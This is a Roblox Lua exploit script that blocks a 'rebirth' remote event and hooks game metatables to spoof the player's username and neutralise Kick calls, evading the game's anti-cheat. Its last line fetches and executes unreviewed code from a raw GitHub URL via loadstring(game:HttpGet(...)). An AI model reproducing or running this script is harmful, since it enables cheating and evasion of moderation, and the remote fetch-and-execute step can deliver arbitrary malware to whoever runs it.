local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer
local ReplicatedStorage = game:GetService("ReplicatedStorage")

local rebirthRemote = ReplicatedStorage:WaitForChild("RemoteEvent"):FindFirstChild("rebirth") or ReplicatedStorage:WaitForChild("rebirth")

if rebirthRemote and typeof(rebirthRemote) == "Instance" and rebirthRemote:IsA("RemoteEvent") then
    local originalFireServer = rebirthRemote.FireServer

    rebirthRemote.FireServer = function(self, ...)
        return
    end

    local oldFireServerHook = hookfunction(originalFireServer, function(...)
        return
    end)

    task.delay(10, function()
        rebirthRemote.FireServer = originalFireServer
        if oldFireServerHook then
            hookfunction(originalFireServer, oldFireServerHook)
        end
    end)
end

local spoofedUsername = "vghjjhhb0"
local Players = game:GetService("Players")
local lp = Players.LocalPlayer
local whitelistedUsername = lp.Name

local mt = getrawmetatable(game)
setreadonly(mt, false)
local oldIndex = mt.__index
mt.__index = newcclosure(function(t, k)
    if t == lp and k == "Name" then
        return spoofedUsername
    end
    return oldIndex(t, k)
end)
setreadonly(mt, true)

wait(1)

local function whitelistSelf()
    local mt2 = getrawmetatable(game)
    setreadonly(mt2, false)
    local oldIndex2 = mt2.__index
    mt2.__index = newcclosure(function(t, k)
        if t == lp and k == "Name" then
            return whitelistedUsername
        end
        return oldIndex2(t, k)
    end)
    setreadonly(mt2, true)
end

whitelistSelf()

wait(1)

local playerMT = getrawmetatable(lp)
setreadonly(playerMT, false)
local oldIndex3 = playerMT.__index
local oldNamecall = playerMT.__namecall

playerMT.__index = newcclosure(function(t, k)
    if k == "Kick" then
        return function() end
    end
    return oldIndex3(t, k)
end)

playerMT.__namecall = newcclosure(function(self, ...)
    local method = getnamecallmethod()
    if method == "Kick" then
        return
    end
    return oldNamecall(self, ...)
end)

setreadonly(playerMT, true)

local function safeLoadString(url)
    local success, result = pcall(function()
        loadstring(game:HttpGet(url))()
    end)
    if not success then
        warn("Error loading script: " .. result)
    end
end

safeLoadString("https://raw.githubusercontent.com/CAXAP26BKyCH/TestUS/refs/heads/main/Te3at")
